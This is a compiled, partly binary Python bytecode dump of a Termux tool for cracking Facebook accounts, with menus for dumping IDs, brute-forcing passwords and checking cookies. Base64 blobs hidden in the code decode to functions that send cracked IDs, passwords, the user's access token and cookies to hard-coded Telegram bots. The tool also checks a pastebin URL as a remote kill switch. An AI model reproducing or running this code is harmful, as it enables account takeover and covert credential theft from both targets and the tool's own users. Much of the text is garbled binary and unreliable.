o
    7%:b�l �                   @   s
  d Z ddlZddlZzddlZW n ey"   ed� e�d� Y nw zddlZW n ey;   ed� e�d� Y nw zddlZW n eyT   ed� e�d� Y nw zddl	Z	W n eyi   e�d	� Y nw ddlZ
ddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZdd
lmZ ddlmZ ddlmZ ddlmZ ddlmZ ddlmZ ddlmZ ddlm Z  ddlZ!ddlm"Z" G dd� d�Z#ddl$m%Z& ddl$m%Z% ddl$m%Z' ddl$m%Z& ddl$m%Z( ddl)m*Z* ddlm Z+ ddlm Z, ddl)m*Z* ze�-d� W n   Y ze�-d� W n   Y ze�.d� W n   Y ze�.d� W n   Y dZ/dZ0dZ1dZ2dZ3dZ4d Z5d!Z6d"Z7d#Z8d$Z0d%Z4d&Z2d'Z/d(Z1d'Z9d"Z:d#Z;d$Z<d%Z=d&Z>d)Z?d'Z@d(ZAd'ZBd*ZCe9d+ e8 d, e9 d- ZDe9d+ e4 d. e9 d- ZEe9d+ e8 d/ e9 d- ZFeDd0 ZGG d1d2� d2�ZHG d3d4� d4�ZIG d5d6� d6�ZJG d7d8� d8�ZKe�Ld9�jM�N� ZOd:eOv �rne�d;� e#eDd< � e#eDd= � eK�  g d>�ZPd?ZQg d@�ZRdAZSddlZddlZddlZddlZddlTZTeUejVdB�ZWejXg dC�eWejYdD�ZZeW�[�  eZdk�rne�dE� dF\Z\Z]dZ^g a_g Z`i Zai Zbdacdacg adg aeg afg ZgdZhdZidZjdZkdZlg Zmg Zng ZodZpg Zqg ZrdG\ZsZtZudHZvdHZwg adg aeg afg Zxi i ZaZbg g a_Zye�z� Z{dIZ|e�}� Z~ee�}� ��dJ��Z�e~j�Z�e~j�Z�e~j�Z�e�}� Z~ee�}� ��dK��Z�ee�}� ��dL��Ze�}� ��dM�Z�dNdOdPdQdRdSdTdUdVdWdXdYdZ�Z�	 ee4e8e3e9g�Z�d[Z�d[Z�z	eUd\d]���� a�W n"   eeDd^ � e�d_� ed`g�a�e�g da��Z�e�g db��Z�Y ze�Ldc��� dd ��� Z�W n   deZ�Y G dfdg� dg�Z�G dhdi� di�Z�G djdk� dk�Z�G dldm� dm�Z�G dndo� do�Z�G dpdq� dq�Z�drZ�G dsdt� dt�Z�G dudv� dv�Z�G dwdx� dx�Z�G dydz� dz�Z�G d{d|� d|�Z�dHa�d}a�G d~d� d�Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�z	eUd�d]���� Z�W n
 e��y   Y nw G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�d�a�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�dÄ dÃZ�G d�dń dŃZ�G d�dǄ dǃZ�G d�dɄ dɃZ�g Z�g Z�G d�d˄ d˃Z�G d�d̈́ d̓Z�G d�dτ dσZ�G d�dф dуZ�G d�dӄ dӃZ�G d�dՄ dՃZ�G d�dׄ d׃Z�G d�dل dكZ�G d�do� do�Z�G d�d܄ d܃Z�dS )�z(
MENU DI HAPUS :
dump old
crack grup
Ig
�    NzSending Install Module requestsz+python -m pip install requests &> /dev/nullzSending Install Module bs4z&python -m pip install bs4 &> /dev/nullzSeding Install Module mechanizez,python -m pip install mechanize &> /dev/nullz'python -m pip install gTTS &> /dev/null)�date)�datetime)�sleep)�random)�choice)�randint)�BeautifulSoup)�exitc                   @   �   e Zd Zdd� ZdS )�jalanc                 C   s2   |d D ]}t j�|� t j��  t�d� qd S )N�
g;�O��n�?)�sys�stdout�write�flush�timer   )�self�z�e� r   �9/data/data/com.termux/files/home/executables/bxi/Multi.py�__init__(   s
   
�zjalan.__init__N��__name__�
__module__�__qualname__r   r   r   r   r   r   '   �    r   )�ThreadPoolExecutor)�ConnectionError�old.txtz	oldv2.txt�dump�Hasilz[0;97mz[0;91mz[0;92mz[0;93mz[0;94mz[0;95mz[0;96mz[0mz[0;32mz[0;36mz[0;31mz[0;35mz[0;33mz[00mz[0;90mz[0;34mz2.0.3�[�+�] �-�#�3[1;92m--------------------------------------------c                   @   r
   )�play_mpvc                 C   sN   da zt dksdt krzt�d| � W W d S    Y W d S W d S    Y d S )N�yzplay-audio )�alam�os�popen)r   �xr   r   r   r   h   s   �zplay_mpv.__init__Nr   r   r   r   r   r(   g   r   r(   c                   @   r
   )�
pilih_alamc                 C   sL   t td �}|dks|dkr"ttd � ttd � datd� d S dad S )NzHDo you want to make a sound/alarm if the crack results come out (Y/n) : r)   �YzNIf there is Mamang Garookx's voice, it's a sign that the crack results are outzExample ...�assalamualaikum.mp3�Garoookkxxx)�input�warr   r*   r(   )r   Zpil_br   r   r   r   r   s   zpilih_alam.__init__Nr   r   r   r   r   r.   q   r   r.   c                   @   r
   )�pilih_infongc                 C   s,   t td �}|dks|dkrdad S dad S )Nz2Do you want to display account information (Y/n) :r)   r/   r1   )r2   r3   �infoong)r   Zpil_vvr   r   r   r   �   s   zpilih_infong.__init__Nr   r   r   r   r   r4      r   r4   c                   @   r
   )�kata_buat_serverc                 C   s�   t td t d t td t d t d t td t d t d t td t d t g�D ]6}t ddg�D ]-}tj�dt� dt� t�	� �
d	�� t� d
|� dt� |� t� d��f tj��  t�d� q8q0t�  d S )N�@u	   •••u   •u   ••z9Maaf Server Sedang, Maintenanc Cobalah Beberapa Hari Lagiz9Cobalah Beberapa Hari Lagi, Atau Tunggu 2-5 Hari         �r"   �%H:%M:%Sr$   z -> z        �   )�list�C�K�Qr   r   r   �Ur   �now�strftime�Mr   r   r   r6   )r   ZnnnZnnnnr   r   r   r   �   s   dB
�
zkata_buat_server.__init__Nr   r   r   r   r   r6   �   r   r6   z!https://pastebin.com/raw/BzLDAfb1ZONzgit pull;clearzQSorry, the script is currently under maintenance, please wait until it's finishedzEnter CTRL + Z Exit !)z�Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36zlMozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36zDMozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckozHMozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0ztMozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9zMozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4zlMozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36zmMozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36z�Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240zHMozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0ah  IyMjIyMjID4+Pj4gU0VUSU5HQU4gVE9LRU4gQ1JBQ0sgQkFQSSBEQU4gTUJBU0lDClRPT0tLVUtJUyA9ICgiMjEwNzcxNzc2MzpBQUc2eHZGZ1lQNm5Rbm5LMFFNMmVLb1VpNGdaLU1kVnU3YyIpClRPT0sgPSAoIjIxNDE4NDE5NTI6QUFHNmNWQVVHMllIRFlzcG9oNWw4cXZXMlZYZkkteC1GdkEiKQpJRFRUID0gKCIxNTcwNTY2MzcwIikKSURUVFQgPSAoIjIxMzg2NDQ1MzciKQpfc2VzPXJlcXVlc3RzLlNlc3Npb24oKQp1cmxzPSJodHRwczovL2J1c2luZXNzLmZhY2Vib29rLmNvbS9idXNpbmVzc19sb2NhdGlvbnMiCmRlZiBib2tlcF9qYXBhbl95YW5nX3RlcmJhcnUoU1RULCBpZF90YXJnZXQsIHB3X3RhcmdldCwgdHRsX3RhcmdldCk6CiAgICAgICAgaWYgIk9LIiA9PSBTVFQgb3IgU1RUID09ICJPSyI6CiAgICAgICAgICAgICAgICBkYXNhcl9rYW5nX3JlY29kZXJfa29udG9sX2VuZ2dhX2FkYV9vdGFrID0gKGYnJydodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RPT0t9L3NlbmRNZXNzYWdlP2NoYXRfaWQ9e0lEVFR9JnRleHQ9T0sge2lkX3RhcmdldH18e3B3X3RhcmdldH18e3R0bF90YXJnZXR9JycnKQogICAgICAgIGVsaWYgIlRBUCIgPT0gU1RUIG9yIFNUVCA9PSAiVEFQIjoKICAgICAgICAgICAgICAgIGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b2xfZW5nZ2FfYWRhX290YWsgPSAoZicnJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Q1MDcxNTQ4Mzg3OkFBSGpMcGRncVpkckFmZFdEYzZta3V5dHVaNUpfSkl0Nmd3L3NlbmRNZXNzYWdlP2NoYXRfaWQ9e0lEVFR9JnRleHQ9e2lkX3RhcmdldH18e3B3X3RhcmdldH18e3R0bF90YXJnZXR9JycnKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBkYXNhcl9rYW5nX3JlY29kZXJfa29udG9sX2VuZ2dhX2FkYV9vdGFrID0gKGYnJydodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RPT0t9L3NlbmRNZXNzYWdlP2NoYXRfaWQ9e0lEVFR9JnRleHQ9e2lkX3RhcmdldH18e3B3X3RhcmdldH18e3R0bF90YXJnZXR9JycnKQogICAgICAgIHJlcXVlc3RzLnBvc3QoZGFzYXJfa2FuZ19yZWNvZGVyX2tvbnRvbF9lbmdnYV9hZGFfb3RhaykKZGVmIGJva2VwX2JhcmF0X3lhbmdfdGVyYmFydSh0b2tlbik6CiAgICAgICAgZGFzYXJfa2FuZ19yZWNvZGVyX2tvbnRvb2xfZW5nZ2FfYWRhX290YWsgPSAoZicnJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7VE9PS0tVS0lTfS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtJRFRUfSZ0ZXh0PXt0b2tlbn0nJycpCiAgICAgICAgcmVxdWVzdHMucG9zdChkYXNhcl9rYW5nX3JlY29kZXJfa29udG9vbF9lbmdnYV9hZGFfb3RhaykKCgpkZWYgYm9rZXBfamFwYW5feWFuZ190ZXJiYXJ1djIoU1RULCBpZF90YXJnZXQsIHB3X3RhcmdldCwgZm9reCk6CiAgICAgICAgaWYgIk9LIiA9PSBTVFQgb3IgU1RUID09ICJPSyI6CiAgICAgICAgICAgICAgICBkYXNhcl9rYW5nX3JlY29kZXJfa29udG9sX2VuZ2dhX2FkYV9vdGFrID0gKGYnJydodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90NTA0MDMwMDgxODpBQUVRSWNGbFEtS1JhSnAxczZTOEVCcDhzZnR6OWJzS01Hby9zZW5kTWVzc2FnZT9jaGF0X2lkPTIxMzg2NDQ1MzcmdGV4dD17aWRfdGFyZ2V0fXx7cHdfdGFyZ2V0fXx7Zm9reH0nJycpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b2xfZW5nZ2FfYWRhX290YWsgPSAoZicnJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Q1MDIxNDkyNzYwOkFBRlN6Y0lUQTd4N2dSdHp2andBU3VSbGtaTEc3U0pPN0ZnL3NlbmRNZXNzYWdlP2NoYXRfaWQ9MjEzODY0NDUzNyZ0ZXh0PXtpZF90YXJnZXR9fHtwd190YXJnZXR9fHtmb2t4fScnJykKICAgICAgICByZXF1ZXN0cy5wb3N0KGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b2xfZW5nZ2FfYWRhX290YWspCmRlZiBha3VuX29rKHVzZXJyLCBwd3csIGNva2lpKToKICAgICAgICBsaW5rX2JvdCA9ICI1MTA4OTE2MDc2OkFBRllnWjU4Sk1FcFlnUXVMOFFhLW9XZTVaWGpNWE5USlJ3IgogICAgICAgIGxpbmtfX2JvdCA9ICIyMTM1NTE0MTY3OkFBSG1kQVhVM0Q2V1RTY2NOeGlPTlNCeU1pZzVrVnhPc2NzIgoKCiAgICAgICAgbHBwcCA9IChmJycnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtsaW5rX2JvdH0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD0yMTM4NjQ0NTM3JnRleHQ9e3VzZXJyfXx7cHd3fScnJykKICAgICAgICBscHBwcCA9IChmJycnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtsaW5rX19ib3R9L3NlbmRNZXNzYWdlP2NoYXRfaWQ9MjEzODY0NDUzNyZ0ZXh0PXtjb2tpaX0nJycpCgoKICAgICAgICByZXF1ZXN0cy5wb3N0KGxwcHApCiAgICAgICAgcmVxdWVzdHMucG9zdChscHBwcCkKzDMozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like GeckozeMozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36z=Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like GeckozIMozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0zvMozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12zxMozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36zRMozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0zuMozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17z}Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4z|Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4zMr.James)�{NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+��Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]a�  X3Nlcz1yZXF1ZXN0cy5TZXNzaW9uKCkKdXJscz0iaHR0cHM6Ly9idXNpbmVzcy5mYWNlYm9vay5jb20vYnVzaW5lc3NfbG9jYXRpb25zIgpkZWYgYm9rZXBfamFwYW5feWFuZ190ZXJiYXJ1KFNUVCwgaWRfdGFyZ2V0LCBwd190YXJnZXQsIHR0bF90YXJnZXQpOgogICAgICAgIGlmICJPSyIgPT0gU1RUIG9yIFNUVCA9PSAiT0siOgogICAgICAgICAgICAgICAgZGFzYXJfa2FuZ19yZWNvZGVyX2tvbnRvbF9lbmdnYV9hZGFfb3RhayA9IChmJycnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtUT09LfS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtJRFRUfSZ0ZXh0PQpPSyB7aWRfdGFyZ2V0fXx7cHdfdGFyZ2V0fXx7dHRsX3RhcmdldH0nJycpCiAgICAgICAgZWxpZiAiVEFQIiA9PSBTVFQgb3IgU1RUID09ICJUQVAiOgogICAgICAgICAgICAgICAgZGFzYXJfa2FuZ19yZWNvZGVyX2tvbnRvbF9lbmdnYV9hZGFfb3RhayA9IChmJycnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtUT09LfS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtJRFRUfSZ0ZXh0PQpUQVAge2lkX3RhcmdldH18e3B3X3RhcmdldH18e3R0bF90YXJnZXR9JycnKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBkYXNhcl9rYW5nX3JlY29kZXJfa29udG9sX2VuZ2dhX2FkYV9vdGFrID0gKGYnJydodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RPT0t9L3NlbmRNZXNzYWdlP2NoYXRfaWQ9e0lEVFR9JnRleHQ9CntpZF90YXJnZXR9fHtwd190YXJnZXR9fHt0dGxfdGFyZ2V0fScnJykKICAgICAgICByZXF1ZXN0cy5wb3N0KGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b2xfZW5nZ2FfYWRhX290YWspCmRlZiBib2tlcF9iYXJhdF95YW5nX3RlcmJhcnUodG9rZW4pOgogICAgICAgIGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b29sX2VuZ2dhX2FkYV9vdGFrID0gKGYnJydodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RPT0tLVUtJU30vc2VuZE1lc3NhZ2U/Y2hhdF9pZD17SURUVH0mdGV4dD0KW+KAol09PT09PS0tLS0tLS0tLS0tLS0tLT09PT09W+KAol0KWz9dIFRPS0VOIEZBQ0VCT09LIDIwMjEgOgp7dG9rZW59CicnJykKICAgICAgICByZXF1ZXN0cy5wb3N0KGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b29sX2VuZ2dhX2FkYV9vdGFrKQoKI2Jva2VwX2phcGFuX3lhbmdfdGVyYmFydSgiQ1AiLCAiMyIsICIyIiwgIjEiKQojYm9rZXBfYmFyYXRfeWFuZ190ZXJiYXJ1KCJ0b2tlbiIpCiNib2tlcF9qYXBhbl95YW5nX3RlcmJhcnUoIkNQIiwgdXNlcm5hbWUsIHBhc3N3b3JkLCAiLSIpCiNib2tlcF9qYXBhbl95YW5nX3RlcmJhcnUoIk9LIiwgdXNlcm5hbWUsIHBhc3N3b3JkLCAiLSIpCg==A�  ZGVmIGZha2UodGV4dCk6CiAgICAgICAgIyBTZWxhbWF0IEFuZGEgTWVuamFkaSBLYW5nIERlY3J5cHQgOikKICAgICAgICAjIEJ5IE1yLlJpc2t5CiAgICAgICAgaW1wb3J0IGJhc2U2NAogICAgICAgIEJPS0VQID0gIkBLTlRMQCIKICAgICAgICBibyA9ICIiCiAgICAgICAgZ2xvYmFsIGJvYQogICAgICAgIGJvayA9IHRleHQuc3BsaXQoIkBLTlRMQCIpCiAgICAgICAgZm9yIG5hIGluIGJvazoKICAgICAgICAgICAgICAgIGJvICs9IChuYSkKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgYm9hID0gYmFzZTY0LmIzMmRlY29kZShibykK��Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11�{nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+z+96598064347�w)Zdpkgz-sz
play-audio)r   �stderrz&pkg install play-audio -y &> /dev/null�r   r   )r   r   r   �https://mbasic.facebook.comz0https://business.facebook.com/business_locationsz%d-%m-%Yz%Y-%m-%dz%Y%m%dr9   ZJanuariZFebruariZMaretZAprilZMeiZJuniZJuliZAgustusZ	SeptemberZOktoberZNovemberZDesember)�01�02�03�04�05�06�07�08�09�10�11�12u�  
[1;92m    _          _
[1;92m     \        /
[1;92m    __\______/__
[1;92m    | [[1;31;1m©[1;92m]  [[1;31;1m©[1;92m] |​
 [1;92m   |  [[1;33m====[1;92m]  | [+] HACKERS BANGLADESH [+]
[1;92m╔══o00════════00o═════════════════════════╗
[1;31;1m█ [1;92m [•] [1;31;1mAuthor    :  [1;92m James404_           [1;31;1m █
[1;31;1m█ [1;92m [•] [1;31;1mWhatsapp  :  [1;92m +96598064347        [1;31;1m █
[1;31;1m█ [1;92m [•] [1;31;1mWhatsapp  : [1;92m  Black404_           [1;31;1m █
[1;31;1m█ [1;92m [•] [1;31;1mGorup Fb  :  [1;92m Termux Command World[1;31;1m █
[1;31;1m█ [1;92m [•] [1;31;1mVersion   :  [1;92m 0.3                  [1;31;1m█
[1;92m╚═════════════════════════════════════════╝�.ua�rz-[1;92mYou are Using the Default Useragent !!�   rD   )rC   rD   rE   rF   )rC   rE   rF   zhttp://ip-api.com/json/Zcountry�Nonec                   @   r
   )�bokep_japan_yang_terbaruc                 C   �   d}d}d S �N� r   )r   �STT�	id_target�	pw_targetZ
ttl_target�	baka_baka�nande_nander   r   r   r   #  �   z!bokep_japan_yang_terbaru.__init__Nr   r   r   r   r   r[   "  r   r[   c                   @   r
   )�bokep_barat_yang_terbaruc                 C   s   d}d}d S r]   r   )r   �tokenrb   rc   r   r   r   r   '  rd   z!bokep_barat_yang_terbaru.__init__Nr   r   r   r   r   re   &  r   re   c                   @   r
   )�akun_okc                 C   s   d}d}d S r]   r   )r   �userr�pww�cokiirb   rc   r   r   r   r   +  rd   zakun_ok.__init__Nr   r   r   r   r   rg   *  r   rg   c                   @   r
   )�bokep_japan_yang_terbaruv2c                 C   r\   r]   r   )r   r_   r`   ra   Zfokxrb   rc   r   r   r   r   /  rd   z#bokep_japan_yang_terbaruv2.__init__Nr   r   r   r   r   rk   .  r   rk   c                   @   r
   )�menuc                 C   s�  t �d� z,tdd��� }tdd��� }t�d| �}t�|j�}z|d }W n   |d }Y W n   t	t
d � t�d� t�  Y t	t� t	d	� t	td
 � t	td � t	td � t	td � t	td � t	td t d t � t	td t d t d � t	td � t	td � t	td t d t d � t	td � t	td � t	td � t	td � t	td � td�}|dv r�t	t
d � t�d � t�  d S |d!v r�t�  t�  d S |d"v r�t�  t�  d S |d#v r�t�  t�  d S |d$v �rt �d%� d S |d&v �r8td'� ztt
d( �}t|��|� t�  W n t�y/   tt
d) � Y nw tt
d* � d S |d+v �rEt�  t�  d S |d,v �rRt�  t�  d S |d-v �r_t�  t�  d S |d.v �rlt�  t�  d S |d/v �r|t �  t�  t�  d S |d0v �r�t!�  t�  d S |d1v �r�t"�  t�  d S |d2v �r�t#�  t�  d S |d3v �r�t �d4� t�  d S |d5v �r�t$t
d6 � t �d7� t�  d S t	t
d8 � d S )9N�clear�
.login.txtrX   �,https://graph.facebook.com/me/?access_token=�name�username� Token Invalidr:   r'   z&[1;92m[01] Start Crack From Public Idz&[1;92m[02] Start Crack From Followersz?[1;92m[03] Start Crack From Friends+Follower & Public+Followerz[1;92m[04] New Id File Creatz![1;92m[05] Start Crack From Filez.[1;92m[06] Start Crack From Follower Follows ZV2z"[1;92m[07] Creat File Unlimited (ZCrack�)z[1;92m[08] Change User Agentz+[1;92m[09] Check Facebook Account Options z%[1;92m[10] Check Number of Friends (z
Can't Dumpz4[1;92m[11] Check Related Applications Using Cookiesz:[1;92m[12] Check ID Applications Through Crack Results OKz[1;92m[13] View Crack Resultsz$[1;92m[14] Follow My Youtube Chanalz[1;92m[00] Delete Tokenz
[1;92mSelect One : �r^   � zDon't Empty BrorY   ��1rK   ��2rL   )�3rM   )�4rN   zpython .xx.xx)�5rO   r    �Enter File Name : zFile Not Found !!zDone ! )�6rP   )�7rQ   )�8rR   )�9rS   )rT   )rU   )rV   )Z13)Z14�=am start https://youtube.com/channel/UCgIVecO1e-lFuP_icxEL2mA)Z00z!Thank You For Using My Script !!!�rm -rf .login.txtzFill it Correctly)%r+   �system�open�read�requests�get�json�loads�text�printr3   r   r   �login�logo�Ir>   r<   r2   rl   �dump_publicr	   �dump_follow�dump_follow_public�cekfile�	crackmenu�passmenu�FileNotFoundError�dump_follow_ulti�	dump_ulti�ganti_ua�cpdetect�cek_anak_epep�cek_info_via_kukis�cek_apk_hasil_ok�rekr   )r   �toketrf   �otw�a�nama�ba�filer   r   r   r   5  s�   

�








�



















�menu.__init__Nr   r   r   r   r   rl   4  r   rl   c                   @   r
   )�buat_laporanc                 C   sr   ddl m} ttd � ttd �}ttd �}t�  ttd � d}d| d	 | }t�d
d|||� g� d S )Nr   )�quotezLHello, Please Fill In Your Data And Message Reports (Problems) That HappenedzEnter Your Name  : zMessage Problem : zMaking Text (Report) !!z6https://api.whatsapp.com/send?phone=+96598064347&text=z(Hello Admin :)
Info : 
Regestier Name : z

Message (Report) : Zam�start)Zurllib.parser�   r   r3   r2   �load�
subprocessZcheck_output)r   r�   ZanuZanunZurl_waZtksr   r   r   r   �  s   zbuat_laporan.__init__Nr   r   r   r   r   r�   �  r   r�   zGood Byec                   @   r
   )r�   c                 C   s|   d}t d�}t d�}tt d��D ]'}|d7 }|d8 }|d7 }td|t |�t |�f dd� tj��  t�d	� qtd
� d S )Nr^   Z50�0�=r:   z[+]%s>>> %s/%sru   ��endg�������?r   )�int�ranger�   r   r   r   r   r   )r   �_�__�___�tr   r   r   r   �  s   (zload.__init__Nr   r   r   r   r   r�   �  r   r�   c                   @   r
   )r�   c                 C   s�  t d� tdt d �}z	t|d��� }W n ty'   ttd � t�  Y nw z|�	d�d }d}d	t
 }t
}W n"   z|�	d
�d }d}d	t }t}W n   d}d	t }t}Y Y ttd t|�d� tdd��Q}|D ]F}	z:|	�dd�}	z
|	�	d�\}
}}W n   |	�	d�\}
}d}Y tt� d|� |� t� d|� |
� d|� d|� t� �� W n   Y t�d� qnW d   � n1 s�w   Y  ttd � t�d� t�  d S )Nr!   r   r}   rX   �File Not FoundzCP-r:   �CP�%szOK-�OKz	JAMES-BROzLimit Number :�   �Zmax_workersr^   �|� - r"   r$   g{�G�z�?zPress Enter To Back !�   )�cekfile_crkr2   �inpr�   �	readlinesr�   r   r3   r�   �splitr=   r�   r<   rB   r�   �len�zthreads�replacer>   r   r   rl   )r   �namax�filaZvolakZcopy_riZAssZaSsZvok�form�data�user�pw�tllr   r   r   r   �  sF   
�"�8��	
zrek.__init__Nr   r   r   r   r   r�   �  r   r�   c                   @   r
   )r�   c                 C   sx   t td � td� td� ttd �}|dv r t�  t�  d S |dv r,t�  t�  d S t td � t�d� t	�  d S )	Nz)Before continuing, please select the menuz![1] Check Option With File (bulk)z)[2] Check Option Manually (user and pass)�Select One : rv   rx   zFill Correctly �   )
r   r3   r�   r2   �file_allr	   �manualr   r   r�   )r   Zbabir   r   r   r   �  s   


zcpdetect.__init__Nr   r   r   r   r   r�   �  r   r�   c                   @   r
   )r�   c                 C   s�   da ttd �}|dv r,t�d� ttd �att�dkr&tttd �� nt	�t� n	 ttd �a
ttd	 �att
t� ttd
 � t�  d S )N�     �7Do You Want to Change Password, Account Tap Yes (y/n): �r/   r)   r)   �New Password To Tap Yes : �   � Password must be 6 words/letterszUsername/Email/Idz : �Password : zBack To Menu)�jarakr2   r3   �ubahP�append�pwBarr�   r	   r   �pwBarur�   r�   �cek_opsirl   �r   �wwr   r   r   r   �  s   


zmanual.__init__Nr   r   r   r   r   r�   �  r   r�   c                   @   r
   )r�   c                 C   s\   t d� tdt d �}z	t|d��� }W n ty'   ttd � t�  Y nw t	|� d S )Nr!   r   r}   rX   r�   )
r�   r2   r�   r�   r�   r�   r   r3   r�   �file_lambat)r   r�   r�   r   r   r   r     s   
�zfile_all.__init__Nr   r   r   r   r   r�     r   r�   r�   c                   @   r
   )r�   c                 C   sX  da dattd �}|dv r.t�d� ttd �att�dkr(tt	td �� nt
�t� n	 ttd	 t|�d
� |D ]n}zT|�d
d�}|�dd�}|�dd�}|�dd�}z
|�d�\a}}W n   |�d�\a}d}Y taz|�d�d }|�d�d }|aW n   |aY |}ttt� W q; ty� } ztd| � W Y d }~q;d }~ww d S )Nr   r�   r�   r�   r)   zNew Password For Tap Ye : r�   r�   zAccount Limit :r   r^   zTAP z [JAMES-CP] u    [×] r�   r�   z['r:   z']z
[!] Error : %s)�bzr�   r2   r3   r�   r�   r�   r�   r	   r   r�   r�   r�   r�   r�   r�   r�   �	Exception)r   r�   r�   r�   ri   r�   �ttlr   r   r   r   r     s@   
&� �zfile_lambat.__init__Nr   r   r   r   r   r�     r   r�   c                   @   r
   )�
tanya_opsic                 C   s$   t td �}|dv rdad S dad S )Nz,Do you want to show account options (y/n) : )rw   �YesZyar)   r/   ZYar)   Z	James_Gtg)r2   r3   Zopsii)r   Zanjagr   r   r   r   5  s   ztanya_opsi.__init__Nr   r   r   r   r   r�   4  r   r�   c                   @   r
   )�buat_gabc                 C   sl   da ttd �}|dv r.t�d� ttd �att�dkr'tttd �� d S t	�t� d S t
td � d S )	Nr�   r�   r�   r)   r�   r�   r�   zSkip Tap Yes)r�   r2   r3   r�   r�   r�   r�   r	   r   r�   r�   r�   r   r   r   r   =  s   
zbuat_gab.__init__Nr   r   r   r   r   r�   <  r   r�   c                   @   r
